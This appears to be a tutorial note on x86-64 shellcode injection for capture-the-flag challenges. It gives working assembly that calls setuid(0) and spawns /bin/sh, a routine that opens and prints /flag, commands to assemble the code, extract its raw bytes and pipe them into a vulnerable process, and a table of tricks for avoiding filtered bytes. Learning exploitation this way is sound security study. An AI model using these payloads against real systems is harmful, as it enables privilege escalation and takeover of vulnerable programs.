# Shellcode Injection

## Resources

- [syscall.sh](https://syscall.sh/): Your cheat sheet for syscalls. A glance here, and you're always ahead.
- [Syscalls Manpage](https://man7.org/linux/man-pages/man2/syscalls.2.html): Understand not just the calls, but their deeper implications.
- [Felix Cloutier](https://www.felixcloutier.com/x86/): Dive into the heartbeats of instructions, ensuring you're always in step.
- [x86asm Reference:](http://ref.x86asm.net/coder64.html) Decode the bytes into moves, turning the tables on any challenge.
- [Debugging - Reverse Execution](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Reverse-Execution.html)
- [shell-storm](https://shell-storm.org/shellcode/index.html)
- [Online x86/x64 assembler/disassembler](https://defuse.ca/online-x86-assembler.htm) - Convert assembly into byte code

## Writing Shellcode

Simple way to pop a shell:

```assembly
.global _start
_start:
.intel_syntax noprefix
        # setuid
        mov rax, 0x69
        mov rdi, 0
        syscall


        # pop shell with execve
        mov rax, 0x3b
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall

binsh:
        .string "/bin/sh"
```

There are other ways to represent strings in ASM such as hexadecimal:

```assembly
mov rbx, 0x0068732f6e69622f     # mov "/bin/sh\0" into rbx
push rbx                        # push "/bin/sh\0" onto the stack
mov rdi, rsp                    # point rdi at the stack
```

Another goal would be to read the flag:

```assembly
mov rbx, 0x00000067616c662f     # push "/flag" onto stack
push rbx
mov rax, 2                      # syscall for open
mov rdi, rsp                    # point the first argument at stack ("/flag")
mov rsi, 0                      # NULL second argument
syscall                         # open("/flag", NULL)

mov rdi, 1                      # out fd
mov rsi, rax                    # in fd
mov rdx, 0                      # offset
mov r10, 1000                   # count
mov rax, 40                     # syscall for sendfile
syscall                         # sendfile(1, N, 0, 1000)

mov rax, 60
syscall
```

## Building Shellcode

Assembling shellcode:

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
```

Extracting shellcode:

```bash
objcopy --dump-section .text=shellcode-raw shellcode-elf
```

The resulting shellcode-raw file contains the raw bytes of your shellcode. This is what you would inject as part of your exploits. 

The ELF from before is very useful for testing your shellcode. 

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
./shellcode-elf
```

Disassembling shellcode:

```bash
objdump -M intel -d shellcode-elf
```

Sending shellcode to the stdin of a process (wiht user input afterwards):

```bash
cat shellcode-raw /dev/stdin | ./vulnerable_process
```

Strace a program with your shellcode as input:

```bash
cat shellcode-raw | strace ./vulnerable_process
```

To debug your shellcode, use `strace`

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
strace ./shellcode-elf
```

You can also use `gdb`:

```bash
gdb ./shellcode-elf
r < shellcode-raw
```

## Common Challenges

### Forbidden Bytes

Depending on the injection method, certain bytes might not be allowed. Some common issues:

| Byte (Hex Value) | Problematic Methods |
|------------------|---------------------|
| Null byte \0 (0x00) | strcpy |
| Newline \n (0x0a) | scanf gets getline fgets |
| Carriage return \r (0x0d) | scanf |
| Space (0x20) | scanf |
| Tab \t (0x09) | scanf |
| DEL (0x7f) | protocol specific |

You'll need to craft your instructions creatively by examining the bytes of the op-codes you are using:

| Filter | Bad | Good |
|--------|-----|------|
| no NULLs | mov rax, 0 (48c7c000000000) | xor rax, rax (4831c0) |
| no NULLs | mov rax, 5 (48c7c005000000) | xor rax, rax; mov al, 5 (4831c0b005) |
| no newlines | mov rax, 10 (48c7c00a000000) | mov rax, 9; inc rax (48c7c00900000048ffc0) |
| no NULLs | mov rbx, 0x67616c662f (48bbcf666c6167000000) | mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f (bb666c616748c1e308b32f) |
| printables | mov rax, rbx (4889d8) | push rbx, pop rax (5358, "SX")